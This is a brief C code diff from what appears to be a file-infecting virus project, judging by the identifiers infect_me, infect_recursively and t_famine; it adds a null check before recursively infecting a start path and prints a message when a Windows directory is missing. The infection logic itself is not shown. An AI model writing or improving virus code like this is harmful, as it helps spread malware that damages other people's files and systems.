@@ -103,5 +103,9 @@ static void				infect_me(char *path, t_famine *famine)
 void					infect_recursively(t_famine *famine)
 {
 	get_start_path(famine);
-	infect_me(famine->recursive_path, famine);
+	if (famine->recursive_path != NULL)
+		infect_me(famine->recursive_path, famine);
+	else {
+		print_message(famine, "Can't find windows os directory", false);
+	}
 }
